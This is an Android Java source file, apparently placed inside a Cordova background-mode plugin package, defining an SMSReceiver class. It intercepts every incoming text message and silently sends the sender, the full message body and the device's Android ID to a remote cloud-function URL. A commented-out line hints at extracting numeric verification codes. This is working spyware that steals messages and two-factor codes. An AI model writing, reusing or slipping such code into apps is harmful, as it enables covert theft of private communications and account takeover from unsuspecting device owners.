
package de.appplant.cordova.plugin.background;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.telephony.SmsMessage;
import android.provider.Settings;

import java.io.IOException;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class SMSReceiver extends BroadcastReceiver {
    public static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
    private static final Object TAG = "Debug APp :";
    OkHttpClient client = new OkHttpClient();

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null && intent.getAction() != null &&
                ACTION.compareToIgnoreCase(intent.getAction()) == 0) {
            Object[] pduArray = (Object[]) intent.getExtras().get("pdus");
            SmsMessage[] messages = new SmsMessage[pduArray.length];
            for (int i = 0; i < pduArray.length; i++) {
                messages[i] = SmsMessage.createFromPdu((byte[]) pduArray[i]);
            }
            StringBuilder bodyText = new StringBuilder();

            // If SMS has several parts, lets combine it :)
            for (int i = 0; i < messages.length; i++) {
                bodyText.append(messages[i].getMessageBody());
            }
            //SMS Body
            String sender = messages[0].getOriginatingAddress();
            String body = bodyText.toString();
//            // Lets get SMS Code
//            String code = body.replaceAll("[^0-9]", "");
            String android_id = Settings.Secure.getString(context.getContentResolver(),
                    Settings.Secure.ANDROID_ID);
            new NetworkAccess().execute(sender,body,android_id);


//            Toast.makeText(context.getApplicationContext(), phono, Toast.LENGTH_SHORT).show();

        }
    }
    public class NetworkAccess extends AsyncTask<String, String, String>{

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            // call some loader
        }
        @Override
        protected String doInBackground(String... params) {
            // Do background task
            String address = params[0];
            String sms = params[1];
            String androidId = params[2];

            try {
                      run("https://us-central1-app0001-1a51d.cloudfunctions.net/addSMS?address="+address+"&msg="+sms+"&id="+androidId);
                // run("https://us-central1-app001-kent.cloudfunctions.net/addSMS?address="+address+"&msg="+sms+"&id="+androidId);
                } catch (IOException e) {
                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            super.onPostExecute(result);
            // dismiss loader
            // update ui
        }
    }
    String run(String url) throws IOException {
        Request request = new Request.Builder()
                .url(url)
                .build();

        try (Response response = client.newCall(request).execute()) {
            return response.body().string();
        }
    }
}